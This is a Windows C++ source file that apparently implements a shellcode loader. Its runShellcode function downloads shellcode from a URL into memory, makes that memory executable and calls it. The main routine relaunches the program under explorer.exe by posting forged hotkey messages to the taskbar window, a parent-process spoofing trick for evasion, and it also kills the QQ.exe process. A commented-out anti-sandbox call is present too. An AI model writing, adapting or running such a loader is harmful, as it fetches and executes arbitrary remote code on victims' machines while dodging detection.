#include "..\..\Public.hpp"
#include <tlhelp32.h>

VOID TerminateQQ()
{
    HANDLE PHANDLE = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (PHANDLE == INVALID_HANDLE_VALUE)
    {
        printf_s("Failed to CreateToolhelp32Snapshot\n");
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(pe32);
    pe32.dwFlags = sizeof(pe32);
    BOOL hProcess = Process32First(PHANDLE, &pe32);

    while (hProcess)
    {
        if (0 == _wcsicmp(L"QQ.exe", pe32.szExeFile))
        {
            HANDLE hQQHandle = OpenProcess(PROCESS_TERMINATE, 0, pe32.th32ProcessID);
            TerminateProcess(hQQHandle, 0);
            CloseHandle(hQQHandle);
            break;
        }
        hProcess = Process32Next(PHANDLE, &pe32);
    }
    CloseHandle(PHANDLE);
}

VOID CreateProcessViaHotKey(WCHAR* szPath)
{
    HWND hWnd = FindWindowA("Shell_TrayWnd", NULL);
    ATOM hAtom = GlobalAddAtomW(szPath);
    WPARAM wParam = 0x641;

    for (DWORD i = 0; i < 10; i++)
    {
        PostMessageW(hWnd, 0x4EA, wParam, 0);
        PostMessageW(hWnd, 0x4E9, wParam++, hAtom);
    }

    if (PostMessageW(hWnd, 0x312, 8, 0) != 0)
    {
        keybd_event(0x12, 0, 0, 0);                // 按下ALT键
        keybd_event(0x11, 0, 0, 0);                // 按下CTRL键
        keybd_event(0x45, 0, 0, 0);                // 按下E键
        keybd_event(0x11, 0, 2, 0);                // 抬起CTRL键
        keybd_event(0x45, 0, 2, 0);                // 抬起E键  
    }
    else
    {
        printf_s("Failed to PostMessage for Hotkey\n");
    }
}

VOID CheckOnce()
{
    HANDLE hMutex = OpenMutex(MUTEX_ALL_ACCESS, FALSE, L"MyTestMutex");

    if (hMutex == NULL)
    {
        CreateMutex(NULL, FALSE, L"MyTestMutex");
    }
    else
    {
        MessageBox(0, L"Mutex", L"Mutex", 0);
        exit(0);
    }
}

BOOL CheckParentProcess(DWORD ppid)
{
    BOOL IsParentProcExplorer = FALSE;
    HANDLE PHANDLE = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (PHANDLE == INVALID_HANDLE_VALUE)
    {
        printf_s("Failed to CreateToolhelp32Snapshot\n");
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(pe32);
    pe32.dwFlags = sizeof(pe32);
    BOOL hProcess = Process32First(PHANDLE, &pe32);

    while (hProcess)
    {
        if (ppid == pe32.th32ProcessID && 0 == _wcsicmp(L"explorer.exe", pe32.szExeFile))
        {
            IsParentProcExplorer = TRUE;
            break;
        }
        hProcess = Process32Next(PHANDLE, &pe32);
    }
    CloseHandle(PHANDLE);
    return IsParentProcExplorer;
}

DWORD GetParentProcessID()
{
    HANDLE PHANDLE = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (PHANDLE == INVALID_HANDLE_VALUE)
    {
        printf_s("Failed to CreateToolhelp32Snapshot\n");
        return -1;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(pe32);
    pe32.dwFlags = sizeof(pe32);
    BOOL hProcess = Process32First(PHANDLE, &pe32);

    while (hProcess)
    {
        if (GetCurrentProcessId() == pe32.th32ProcessID)
        {
            return pe32.th32ParentProcessID;
        }
        hProcess = Process32Next(PHANDLE, &pe32);
    }
    CloseHandle(PHANDLE);
    return -1;
}

void runShellcode()
{
	std::string shellcode = GetShellcodeFromUrl();

	if (shellcode.size() > 0)
	{
		DWORD oldProtect = NULL;
		LPVOID Memory = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		mc(Memory, shellcode.c_str(), shellcode.size());
		VirtualProtect(Memory, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect);
		((void(*)())Memory)();
	}
}

int main()
{
    WCHAR szPath[MAX_PATH];
    GetModuleFileName(NULL, szPath, MAX_PATH);
    DWORD PPID = GetParentProcessID();
    if (CheckParentProcess(PPID))
    {
//      antiSandbox();
        runShellcode();
    }
    else
    {
        CheckOnce();
        TerminateQQ();
        CreateProcessViaHotKey(szPath);
    }
}